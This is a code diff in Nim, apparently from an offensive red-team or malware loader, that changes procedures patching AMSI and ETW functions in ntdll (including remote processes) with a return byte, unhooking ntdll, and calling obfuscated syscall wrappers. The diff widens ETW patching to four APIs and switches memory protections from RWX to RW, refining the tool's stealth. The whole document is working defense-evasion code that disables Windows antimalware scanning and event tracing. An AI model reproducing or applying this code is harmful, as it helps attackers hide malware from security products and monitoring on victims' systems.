@@ -61,7 +61,7 @@ proc PatchAmsi(): bool =
         buffer          : LPVOID
 
 
-    status = uashdiasdj(pHandle, addr protectAddress,addr friendlycodeLength,0x40,addr t)
+    status = uashdiasdj(pHandle, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                 
     if not NT_SUCCESS(status):
         echo obf("[-] Failed to change memory protections.")
@@ -105,6 +105,7 @@ proc Patchntdll(): bool =
         op: ULONG
         t: ULONG
         disabled: bool = false
+        PatchAPIs: seq[string] = @[obf("EtwNotificationRegister"), obf("EtwEventRegister"), obf("EtwEventWriteFull"), obf("EtwEventWrite")]
 
     when defined amd64:
         let patch: array[1, byte] = [byte 0xc3]
@@ -118,45 +119,48 @@ proc Patchntdll(): bool =
         echo obf("[X] Failed to load ntdll.dll")
         return disabled
 
-    when defined(DInvoke):
-        cs = MyGetProcAddress(ntdll,obf("EtwEventWrite"))
-    else:
-        cs = GetProcAddress(ntdll,obf("EtwEventWrite"))
-    if isNil(cs):
-        echo obf("[X] Failed to get the address of 'EtwEventWrite'")
-        return disabled
+    for singleAPI in PatchAPIs:
+        echo obf("[*] Patching : "),singleAPI
+
+        when defined(DInvoke):
+            cs = MyGetProcAddress(ntdll,singleAPI)
+        else:
+            cs = GetProcAddress(ntdll,singleAPI)
+        if isNil(cs):
+            echo obf("[X] Failed to get the address of "), singleAPI
+            break
 
 
-    var hProcess: HANDLE
-    when defined(DInvoke):
-        hProcess = MyGetCurrentProcess()
-    else:
-        hProcess = GetCurrentProcess()
-    var oldProtection: DWORD = 0
-    var success: BOOL
+        var hProcess: HANDLE
+        when defined(DInvoke):
+            hProcess = MyGetCurrentProcess()
+        else:
+            hProcess = GetCurrentProcess()
+        var oldProtection: DWORD = 0
+        var success: BOOL
 
-    var protectAddress = cs
+        var protectAddress = cs
 
-    var friendlycodeLength = cast[SIZE_T](patch.len)
-    success = uashdiasdj(hProcess,addr protectAddress,addr friendlycodeLength,0x40,addr t) 
-    if (success != 0):
-        echo obf("uashdiasdj failed")
-        return disabled
-    echo obf("[*] Applying Syscall (SysWhispers) ETW patch")
-    var outLength: SIZE_T
+        var friendlycodeLength = cast[SIZE_T](patch.len)
+        success = uashdiasdj(hProcess,addr protectAddress,addr friendlycodeLength,0x04,addr t) 
+        if (success != 0):
+            echo obf("uashdiasdj failed")
+            break
+        echo obf("[*] Applying Syscall (SysWhispers) ETW patch")
+        var outLength: SIZE_T
     
-    success = oqiazasusjk(hProcess,cs,unsafeAddr patch,patch.len,addr outLength)
+        success = oqiazasusjk(hProcess,cs,unsafeAddr patch,patch.len,addr outLength)
     
-    if (success != 0):
-        echo obf("oqiazasusjk failed")
-        return disabled
-    success =  uashdiasdj(hProcess,addr protectAddress,addr friendlycodeLength,t,addr op)
-    if (success != 0):
-        echo obf("uashdiasdj failed")
-        return disabled
-    else:
-        echo obf("[*] OldProtect set back")
-        disabled = true
+        if (success != 0):
+            echo obf("oqiazasusjk failed")
+            break
+        success =  uashdiasdj(hProcess,addr protectAddress,addr friendlycodeLength,t,addr op)
+        if (success != 0):
+            echo obf("uashdiasdj failed")
+            break
+        else:
+            echo obf("[*] OldProtect set back")
+            disabled = true
     
 
     return disabled
@@ -222,7 +226,7 @@ proc ntdllunhook(): bool =
           var bytesWritten: SIZE_T
           var ds: LPVOID = ntdllBase + hookedSectionHeader.VirtualAddress
           var pSize: SIZE_T = cast[SIZE_T](hookedSectionHeader.Misc.VirtualSize)
-          status = uashdiasdj(processH, &ds, &pSize, 0x40, &oldProtection)
+          status = uashdiasdj(processH, &ds, &pSize, 0x04, &oldProtection)
           if status != 0:
             echo obf("[!] uashdiasdj failed to modify memory permissions:") & fmt"{GetLastError()}."
             return false
@@ -398,7 +402,7 @@ proc RemotePatchAmsi(hProcss :HANDLE): bool =
         buffer          : LPVOID
 
 
-    status = uashdiasdj(hProcss, addr protectAddress,addr friendlycodeLength,0x40,addr t)
+    status = uashdiasdj(hProcss, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                 
     if not NT_SUCCESS(status):
         echo obf("[-] Failed to allocate memory.")
@@ -538,7 +542,7 @@ proc RemotePatchEtw(hProcess : HANDLE) : bool =
         buffer          : LPVOID
 
 
-    status = uashdiasdj(hProcess, addr protectAddress,addr friendlycodeLength,0x40,addr t)
+    status = uashdiasdj(hProcess, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                 
     if not NT_SUCCESS(status):
         echo obf("[-] Failed to allocate memory.")
